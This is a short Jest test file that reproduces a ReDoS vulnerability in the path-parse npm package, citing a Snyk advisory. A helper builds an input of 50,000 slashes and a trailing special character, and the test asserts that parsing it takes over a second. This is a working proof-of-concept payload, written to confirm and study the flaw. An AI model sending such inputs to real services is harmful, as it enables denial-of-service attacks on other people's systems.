//https://snyk.io/vuln/SNYK-JS-PATHPARSE-1077067
function build_attack(n) {
    var ret = ""
    for (var i = 0; i < n; i++) {
        ret += "/"
    }
    return ret + "◎";
}

// for(var i = 1; i <= 5000000; i++) {
//     if (i % 100000 == 0) {
//         var time = Date.now();
        
//         var time_cost = Date.now() - time;
//         console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
//  }
// }

test("ReDos in path-parse", () => {
    const measureTime = require("./utils").measureTime;
    const pathParse = require('path-parse');

    let t =measureTime(function () {
        let attack_str = build_attack(50000)
        pathParse(attack_str);
    
    });
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});